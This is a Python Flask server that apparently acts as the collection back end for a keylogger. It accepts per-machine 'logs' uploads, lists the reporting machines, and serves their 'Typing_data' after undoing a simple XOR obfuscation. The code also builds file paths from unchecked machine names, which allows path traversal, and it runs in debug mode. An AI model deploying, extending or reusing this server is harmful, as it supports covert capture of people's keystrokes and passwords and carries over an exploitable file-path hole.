from flask import Flask, jsonify,request ,current_app ,send_file
import time ,os ,json


app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app.config["DATA_FOLDER"] = os.path.join(BASE_DIR, "My_data")
os.makedirs(app.config["DATA_FOLDER"], exist_ok=True)

@app.route('/')
def home():
    return send_file(os.path.join(os.path.dirname(__file__), "index.html"))


def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H") + ".txt"

def xor_decoding(text):
    return ''.join(chr(int(text[i:i + 2], 16) ^ ord("0123456789"[(i // 2) % len("0123456789")]))
                   for i in range(0, len(text), 2))

@app.route('/upload', methods=['POST'])
def upload():
    DATA_FOLDER = current_app.config["DATA_FOLDER"]
    data = request.get_json()
    if not data or "machine" not in data or "logs" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["logs"]
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    file_name = generate_log_filename()
    file_path = os.path.join(machine_folder,file_name)
    with open(file_path, "a") as f:
        f.write(json.dumps(log_data) + "\n")
    return jsonify({"status": "success", "file": file_path}), 200


@app.route("/machines", methods=["GET"])
def list_machines():
    DATA_FOLDER = current_app.config["DATA_FOLDER"]
    try:
        entries = [
            name for name in os.listdir(DATA_FOLDER)
            if os.path.isdir(os.path.join(DATA_FOLDER, name))]
        return jsonify({"machines": entries}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/Typing_data/<name>",methods=["GET"])
def receiving_typing_data(name):
    logs = []
    DATA_FOLDER = current_app.config["DATA_FOLDER"]
    machine_folder = os.path.join(DATA_FOLDER, name)
    if not os.path.exists(machine_folder):
        return jsonify({"error": f"no data found for machine '{name}'"}), 404

    for filename in os.listdir(machine_folder):
        file_path = os.path.join(machine_folder, filename)
        if os.path.isfile(file_path):
            with open(file_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    line = json.loads(line)
                    (k,v),= line.items()
                    v = xor_decoding(v)
                    logs.append({k:v})
    return jsonify({"machine": name, "logs": logs}), 200


if __name__ == '__main__':
    app.run(debug=True)
